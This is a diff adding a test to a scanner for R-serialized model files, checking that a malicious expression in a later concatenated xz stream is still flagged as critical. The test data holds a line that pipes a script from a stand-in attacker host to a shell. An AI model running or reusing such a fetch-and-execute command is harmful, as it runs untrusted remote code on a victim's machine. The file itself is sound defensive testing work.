@@ -31,6 +31,18 @@ def _write_xz_r_serialized(path: Path, body: str, *, dict_size: int) -> None:
     path.write_bytes(compressed)
 
 
+def _write_concatenated_xz_r_serialized(path: Path, bodies: list[str], *, dict_size: int) -> None:
+    compressed_parts = [
+        lzma.compress(
+            ("X\n" + body).encode("utf-8"),
+            format=lzma.FORMAT_XZ,
+            filters=[{"id": lzma.FILTER_LZMA2, "dict_size": dict_size}],
+        )
+        for body in bodies
+    ]
+    path.write_bytes(b"".join(compressed_parts))
+
+
 def _check_by_name(result: ScanResult, name: str) -> list[Check]:
     return [check for check in result.checks if check.name == name]
 
@@ -207,6 +219,33 @@ def test_scan_truncated_xz_stream_is_handled_fail_closed(tmp_path: Path) -> None
     decompression_checks = _check_by_name(result, "R Serialized Decompression")
     assert len(decompression_checks) == 1
     assert decompression_checks[0].status == CheckStatus.FAILED
+
+
+def test_scan_concatenated_xz_streams_preserve_later_malicious_payloads(tmp_path: Path) -> None:
+    path = tmp_path / "concatenated-xz.rds"
+    _write_concatenated_xz_r_serialized(
+        path,
+        [
+            "safe\nmodel\nweights",
+            "expression\nbase::system('curl https://evil.example/payload.sh | sh')",
+        ],
+        dict_size=1 << 20,
+    )
+
+    assert RSerializedScanner.can_handle(str(path))
+    result = RSerializedScanner().scan(str(path))
+
+    assert result.success is False
+
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    assert symbol_checks[0].status == CheckStatus.FAILED
+    assert symbol_checks[0].severity == IssueSeverity.CRITICAL
+
+    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
+    assert len(payload_checks) == 1
+    assert payload_checks[0].status == CheckStatus.FAILED
+    assert payload_checks[0].severity == IssueSeverity.CRITICAL
 
 
 def test_r_serialized_routes_through_detection_and_registry(tmp_path: Path) -> None:
